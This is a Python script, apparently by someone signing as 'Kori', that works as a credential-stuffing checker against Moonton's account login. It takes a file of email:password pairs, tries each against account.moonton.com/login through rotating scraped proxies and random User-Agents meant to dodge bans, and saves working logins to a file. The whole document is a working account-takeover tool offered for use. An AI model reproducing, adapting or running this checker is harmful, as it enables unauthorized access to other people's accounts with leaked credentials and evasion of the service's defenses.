import requests
import random
import time
import threading

# Maangas na ASCII banner
def print_banner():
    banner = """
    ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ██╗
    ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗  ██║
    ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║   ██║   ██║   ██║██╔██╗ ██║
    ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║   ██║   ██║   ██║██║╚██╗██║
    ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║   ██║   ╚██████╔╝██║ ╚████║
    ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
    
               🔥 MOONTON VALID CHECKER by Kori 🔥
          Manual Proxy File + Auto Proxy Scraper + Anti-Ban
    ==================================================================
    """
    print(banner)

# Random User-Agents para hindi madaling ma-block
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

# Auto-scrape working proxies
def scrape_proxies():
    proxy_sources = [
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxyscan.io/download?type=http",
        "https://www.freeproxy.world/?type=http"
    ]
    
    proxies = []
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies.extend(response.text.split("\n"))
        except:
            pass

    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return proxies if proxies else None

# Mag-load ng proxies mula sa file
def load_proxies(file_path):
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print("[✖] Proxy file not found! Using auto-scraped proxies instead.")
        return scrape_proxies()

def get_random_proxy(proxies):
    """Kumuha ng random proxy mula sa listahan"""
    if proxies:
        proxy = random.choice(proxies)
        return {"http": proxy, "https": proxy}
    return None  # Walang proxy, direct connection

def check_moonton_login(email, password, proxies):
    """Subukan ang Moonton login gamit ang random proxy at User-Agent"""
    url = "https://account.moonton.com/login"
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"email": email, "password": password}

    proxy = get_random_proxy(proxies)  

    for attempt in range(3):  
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10)

            if response.status_code == 200:
                if "success" in response.text:
                    return True  
            return False  

        except requests.RequestException:
            print(f"⚠️ [PROXY ERROR] Retrying... (Attempt {attempt+1}/3)")
            proxy = get_random_proxy(proxies)  

    return None  

# ======== MAIN SYSTEM ========
print_banner()

account_file = input("📂 Enter the path of the account file (e.g., accounts.txt): ")
proxy_file = input("🌐 Enter the path of the proxy file (or press ENTER for auto-scraped proxies): ")

# Load proxies manually or auto-fetch
if proxy_file.strip():
    proxies = load_proxies(proxy_file)
else:
    print("\n🔄 Fetching fresh proxies...")
    proxies = scrape_proxies()

if not proxies:
    print("[❌] Failed to fetch proxies! Please try again later.")
    exit()

print(f"✅ Loaded {len(proxies)} proxies.\n")

try:
    with open(account_file, "r") as file:
        accounts = [line.strip() for line in file.readlines() if line.strip()]

    valid_accounts = []

    def process_account(account):
        try:
            email, password = account.split(":")
            result = check_moonton_login(email, password, proxies)

            if result is True:
                print(f"✅ [VALID] {email}")
                valid_accounts.append(account)
            elif result is False:
                print(f"❌ [INVALID] {email}")
            else:
                print(f"⚠️ [PROXY ERROR] Skipping...")
            
            time.sleep(random.uniform(2, 5))  

        except ValueError:
            print(f"⚠️ [INVALID FORMAT] {account} (Should be email:password)")

    # Multi-threading para mas mabilis
    threads = []
    for account in accounts:
        thread = threading.Thread(target=process_account, args=(account,))
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(1, 3))  

    for thread in threads:
        thread.join()  

    # Save valid accounts to a file
    if valid_accounts:
        with open("valid_accounts.txt", "w") as valid_file:
            valid_file.write("\n".join(valid_accounts))
        print("\n💾 ✅ All valid accounts saved to 'valid_accounts.txt'")

except FileNotFoundError:
    print("[✖] Account file not found! Please enter a valid path.")
